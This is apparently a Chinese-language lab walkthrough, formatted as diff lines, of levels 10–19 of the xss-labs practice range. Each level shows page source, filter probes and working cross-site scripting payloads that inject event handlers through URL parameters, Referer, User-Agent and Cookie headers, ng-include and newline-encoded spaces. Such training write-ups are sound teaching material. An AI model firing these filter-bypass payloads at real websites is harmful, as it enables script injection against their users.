+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:56&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>居然都被实体化了，没法子，只能看一下这关的源码了</p>
+<p><img src="/assets/ec302b1b69ecf092937347f8deb7dfe6-20250425100824-h3518vs.png" alt="ec302b1b69ecf092937347f8deb7dfe6"></p>
+<blockquote>
+<p>​<code>?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</code>​</p>
+</blockquote>
+<p><strong>本关小结</strong>：根据源码猜解传参的参数名，隐藏的input标签可以插入type=“text”显示</p>
+<hr>
+<h1 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level12.php?keyword=good job!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level11&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;http://challenges.ctf.cssec.cc:12170/level10.php?t_sort=%22%20onfocus=javascript:alert()%20type=%22text&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><input>标签有四个值，都做了隐藏处理，不难看出，第四个名为t_ref的<input>标签是http头referer的参数（就是由啥地址转跳到这里的，http头的referer会记录有），我们先做个简单的测试来验证一下前面三个标签名，GET与POST传参都试一下看看</p>
+<p>GET传参：</p>
+<blockquote>
+<p>​<code>?t_link=&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;&amp;t_history=&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;&amp;t_sort=&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<p>发现并未传参成功，我们来试试POST传参，发现POST传参也不行</p>
+<p>POST传参也不得，那应该就referer头了，用burpsuite抓包一下，添加http头</p>
+<blockquote>
+<p>​<code>Referer: &quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level12.php?keyword=good job!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level11&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;http://challenges.ctf.cssec.cc:12170/level10.php?t_sort=%22%20onfocus=javascript:alert()%20type=%22text&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>发现有value值，对比发现，把大于小于号&gt;&lt;给删掉了，但是我们还能用onfocus，构造一个http头</p>
+<blockquote>
+<p>​<code>Referer: &quot; onfocus=javascript:alert() type=&quot;text</code>​</p>
+</blockquote>
+<p>之后我们再看一下这关的源码</p>
+<p><img src="/assets/8b27b251e9938ad0db4c740a0a1c51a5-20250425101933-zsws98m.png" alt="8b27b251e9938ad0db4c740a0a1c51a5"></p>
+<p>跟猜想的一样，这题还有GET传参的，但是有实体化函数在双引号就闭合不了了</p>
+<p>  <strong>本关小结</strong>：考虑一下http头传值，本关是referer，但接下来也有可能是其他头，如Cookie等</p>
+<hr>
+<h1 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level13.php?keyword=good job!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level12&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这肯定是User-Agent头了，再用burpsuite抓包一下，将User-Agent头修改为我们的测试代码</p>
+<blockquote>
+<p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<p>再查看一下源码</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level13.php?keyword=good job!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level12&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;&quot; sRc DaTa OnFocus sCriPt a hReF=javascript:alert() &amp;#106;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>还是过滤了符号和JavaScript:alert() &gt;&lt;</p>
+<p>跟上题一样，构造UA头</p>
+<blockquote>
+<p>​<code>&quot; onfocus=javascript:alert() type=&quot;text</code>​</p>
+</blockquote>
+<p>再看一下这关的源码</p>
+<p><img src="/assets/386739e9acb53ae73944f81e0b267cb8-20250425103919-8sqk298.png" alt="386739e9acb53ae73944f81e0b267cb8"></p>
+<p>跟上一关就一个http头的区别</p>
+<p>  <strong>本关小结</strong>：跟上题一样，考虑一下http头传值</p>
+<hr>
+<h1 id="level13（暂时无法用）"><a href="#level13（暂时无法用）" class="headerlink" title="level13（暂时无法用）"></a>level13（暂时无法用）</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level14.php&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level13&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /var/www/html/level13.php:15) in &lt;b&gt;/var/www/html/level13.php&lt;/b&gt; on line &lt;b&gt;16&lt;/b&gt;&lt;br /&gt;
+&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>名字是t_cook，考虑到是cookie头，我们先看一下这个网页的cookie，F12打开</p>
+<blockquote>
+<p>​<code>&quot; onclick=alert() type=&quot;text </code>​</p>
+</blockquote>
+<p>由于我看不到cookie，我直接构造一个cookie传参，hackbar</p>
+<p><img src="/assets/226c9a180fbc0d54ea9aa0a118ecd970-20250425110507-0240htz.png" alt="226c9a180fbc0d54ea9aa0a118ecd970"></p>
+<p>再刷新一下，点击框框就好了</p>
+<p>再看一下这关的源码</p>
+<p><img src="/assets/d6080656137ce7cddf4f41355afaecf5-20250425110518-wedn7dq.png" alt="d6080656137ce7cddf4f41355afaecf5"></p>
+<p>一样，就一个头的区别</p>
+<p>  <strong>本关小结</strong>：还是http头传参</p>
+<hr>
+<h1 id="level14（暂时无法做）"><a href="#level14（暂时无法做）" class="headerlink" title="level14（暂时无法做）"></a>level14（暂时无法做）</h1><pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;title&gt;欢迎来到level14&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
+&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这关没啥交互，只是会定时转跳到一个奇怪的已经挂掉了的网站，直接看一下后端源码吧</p>
+<p><img src="/assets/ce8a176053ee174b185ead81e09e3394-20250425110706-mp9800m.png" alt="ce8a176053ee174b185ead81e09e3394"></p>
+<p>emmm，跟网站源码一样，这题本来是利用转跳到的网站，在那网站去上传一个，属性里面含有xss代码的图片，以达到弹窗的效果，具体可参考<a href="https://www.freebuf.com/articles/web/282983.html" title="xss-labs靶场-第十四关">xss-labs靶场-第十四关</a></p>
+<p> 由于网站挂了，这里就不能演示</p>
+<hr>
+<h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><pre><code class="language-html">&lt;html ng-app&gt;
+&lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;script src=&quot;angular.min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level16.php?keyword=test&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level15&lt;/title&gt;
+&lt;/head&gt;
+&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
+&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
+&lt;body&gt;&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt;&lt;/body&gt;
+</code></pre>
+<p>可以看到这儿有个陌生的东西ng-include</p>
+<blockquote>
+<p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p>
+</blockquote>
+<p>我们先试试看包涵第一关，构建payload</p>
+<blockquote>
+<p>​<code>?src=&#39;/level1.php&#39;</code>​</p>
+</blockquote>
+<p>所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload</p>
+<blockquote>
+<p>​<code>?src=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;html ng-app&gt;
+&lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;script src=&quot;angular.min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level16.php?keyword=test&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level15&lt;/title&gt;
+&lt;/head&gt;
+&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
+&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
+&lt;body&gt;&lt;span class=&quot;ng-include:&amp;quot; &#39; sRc DaTa OnFocus &amp;lt;sCriPt&amp;gt; &amp;lt;a hReF=javascript:alert()&amp;gt; &quot;&gt;&lt;/span&gt;&lt;/body&gt;
+</code></pre>
+<p>对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload</p>
+<blockquote>
+<p>​<code>?src=&#39;/level1.php?name=&lt;img src=1 onmouseover=alert()&gt;&#39;</code>​</p>
+</blockquote>
+<p>当然也能用p标签，可以构造payload</p>
+<blockquote>
+<p>​<code>?src=&#39;/level1.php?name=&lt;p onmousedown=alert()&gt;哈哈哈&lt;/p&gt;&#39;</code>​</p>
+</blockquote>
+<p>点击哈哈哈即可弹窗，接下来我们看一下这关的后端源码</p>
+<p><img src="/assets/e9a2de48a5b5481081deadd2c07a1c2f-20250425111946-puoeete.png" alt="e9a2de48a5b5481081deadd2c07a1c2f"></p>
+<p>实体化函数，形同虚设</p>
+<p>  <strong>本关小结</strong>：ng-include文件包涵，可以无视html实体化</p>
+<hr>
+<h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level16&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
+&lt;center&gt;test&lt;/center&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:4&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>test插入到了center标签中，所以这里就不用闭合了，老规矩，先测试一波关键字</p>
+<blockquote>
+<p>​<code>?keyword=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106; </code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level16&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
+&lt;center&gt;&quot;&amp;nbsp;&#39;&amp;nbsp;src&amp;nbsp;data&amp;nbsp;onfocus&amp;nbsp;onmouseover&amp;nbsp;onmousedown&amp;nbsp;p&amp;nbsp;&lt;&amp;nbsp;&gt;&amp;nbsp;&lt;a&amp;nbsp;href=java&amp;nbsp;:alert()&gt;&amp;nbsp;&lt;/center&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:139&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>对比发现，这里先是将字母小写化了，再把script替换成空格，最后将空格给实体化，想尝试一下p标签&lt;p οnmοusedοwn=alert()&gt;abc&lt;/p&gt;，谁知道也将/给替换成了空格，无奈，只好看一下后端源码</p>
+<p><img src="/assets/52366f7247628ff8f84c1263e04f81cc-20250425112031-w445z9g.png" alt="52366f7247628ff8f84c1263e04f81cc"></p>
+<p>果然给过掉了，空格可以用回车来代替绕过，回车的url编码是%0a，再配合上不用/的&lt;img&gt;、&lt;details&gt;、&lt;svg&gt;等标签，更多标签可参考<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782" title="XSS常见的触发标签">XSS常见的触发标签</a></p>
+<p> 随便选个标签，将空格替换成回车的url编码，构造payload</p>
+<blockquote>
+<p>​<code>?keyword=&lt;svg%0Aonload=alert(1)&gt;</code>​</p>
+</blockquote>
+<p><strong>本关小结</strong>：回车代替空格绕过检测</p>
+<hr>
+<h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+    &lt;script&gt;
+        window.alert = function() {
+            confirm(&quot;完成的不错！&quot;);
+        }
+    &lt;/script&gt;
+    &lt;title&gt;欢迎来到level17&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
+    &lt;embed src=xsf01.swf?a=b width=100% heigth=100%&gt;    &lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>先测测关键字吧</p>
+<blockquote>
+<p>​<code>?arg01=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+    &lt;script&gt;
+        window.alert = function() {
+            confirm(&quot;完成的不错！&quot;);
+        }
+    &lt;/script&gt;
+    &lt;title&gt;欢迎来到level17&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
+    &lt;embed src=xsf01.swf?&amp;quot; &#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &amp;lt;a hReF=javascript:alert()&amp;gt;; =&amp;quot; &#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &amp;lt;sCriPt&amp;gt; &amp;lt;a hReF=javascript:alert()&amp;gt;; width=100% heigth=100%&gt;    &lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>对比发现，虽然加了该死的html转义，但是这里不需要闭合符号，传入的参数都出现在了embed标签上，打开后缀名为swf的文件（FLASH插件的文件，现在很多浏览器都不支持FLASH插件了）</p>
+<blockquote>
+<p>我们来看看embed标签是啥</p>
+<p><img src="/assets/8e2658aa1bb8638d2e015289b78acae5-20250425112244-r9g0vo4.png" alt="8e2658aa1bb8638d2e015289b78acae5"></p>
+<p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域</p>
+<p>  再看一下onfocus和onclick事件，这两事件是等价的，都是一触即发</p>
+<p><img src="/assets/29243f1cc2cf0b40aff9cedfdc6dabcb-20250425112251-taa72up.png" alt="29243f1cc2cf0b40aff9cedfdc6dabcb"></p>
+<p>支持的标签范围还广，也就是支持embed标签 ，这里呢我们可以尝试插入该标签</p>
+<p>  再看一下onmouse系列的事件</p>
+<p><img src="/assets/bdc8e30b3de88a19cd87a03f2301e800-20250425112300-rsez2hl.png" alt="bdc8e30b3de88a19cd87a03f2301e800"></p>
+<p>跟onfocus事件支持的标签一样</p>
+</blockquote>
+<p>所以，这题的解法很简单，首先得用一个支持flash插件的浏览器打开本关（打开后会有个图片出来的，不支持flash插件浏览器就没有），如果不想下载的话，自己去后端改一下也行，将后端第十七关的代码（level17.php）指向的swf文件改为index.png</p>
+<p><img src="/assets/f7deb8757696c967421ee46c08a7491f-20250425112309-etizka8.png" alt="f7deb8757696c967421ee46c08a7491f"></p>
+<p>改为：</p>
+<p><img src="/assets/2fe0ec3ec283a7d7a851d2b7efbee91b-20250425112319-wrm7dkb.png" alt="2fe0ec3ec283a7d7a851d2b7efbee91b"></p>
+<p>这样我们再去打开第十七关的网站</p>
+<p>就有个embed标签的区域在啦，其实用不用swf文件都一样的，主要是区域，接着我们构造payload</p>
+<blockquote>
+<p>​<code>?arg02= onclick=alert()</code>​</p>
+</blockquote>
+<p>尽管这里的embed标签无法显示，但是我们还是可以通过构造embed属性的方式来利用本关。并且，在本关中src属性竟然没有引号！这无疑给我们的利用带来了很大的便利。因此，结合上述分析，构造Payload如下所示：</p>
+<blockquote>
+<p>​<code>?arg01=a&amp;arg02=123%20onmouseover=alert(1)</code>​</p>
+</blockquote>
+<p>‍</p>
+<p><strong>本关小结</strong>：emm，貌似就是熟悉一下触发事件（如onclick、onmouseover）的使用</p>
+<hr>
+<h1 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h1><p>这次不改后端代码了，换个支持flash插件的浏览器，Cent Browser。</p>
+<p> 先看一下源码</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+    &lt;script&gt;
+        window.alert = function() {
+            confirm(&quot;完成的不错！&quot;);
+        }
+    &lt;/script&gt;
+    &lt;title&gt;欢迎来到level18&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;
+    &lt;embed src=xsf02.swf?a=b width=100% heigth=100%&gt;&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>源码跟上关差别不大，就是换了个swf文件，我们直接测试一波过滤了啥，构建payload</p>
+<blockquote>
+<p>​<code>?arg02=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+    &lt;script&gt;
+        window.alert = function() {
+            confirm(&quot;完成的不错！&quot;);
+        }
+    &lt;/script&gt;
+    &lt;title&gt;欢迎来到level18&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;
+    &lt;embed src=xsf02.swf?=&amp;quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &amp;lt;a hReF=javascript:alert()&amp;gt;; width=100% heigth=100%&gt;&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>emmm，也是只搞了个html实体化函数，也没过滤啥，感觉跟上关一样，用事件触发属性即可（如onmouse系列、onfocus、onclick等）直接上payload</p>
+<blockquote>
+<p>​<code>?arg02= onmousedown=alert()</code>​</p>
+</blockquote>
+<blockquote>
+<p>​<code>?arg01=a&amp;arg02=123%20onmouseover=alert(1)</code>​</p>
+</blockquote>
+<p>看一下后端源码</p>
+<p><img src="/assets/a12ece3d97365774dd08aac84f41fcfa-20250425113404-9tf1c9u.png" alt="a12ece3d97365774dd08aac84f41fcfa"></p>
+<p>就这点过滤。。。。<br>  <strong>本关小结</strong>：跟上一关一样，无！</p>
+<hr>
+<h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level20.php?arg01=a&amp;arg02=b&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level19&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;
+&lt;embed src=&quot;xsf03.swf?=&quot; width=100% heigth=100%&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>网页源码差不多，也就是只有swf文件不同的差别，直接上payload</p>
+<blockquote>
+<p>​<code>?arg02= onmouseup=alert()</code>​</p>
+</blockquote>
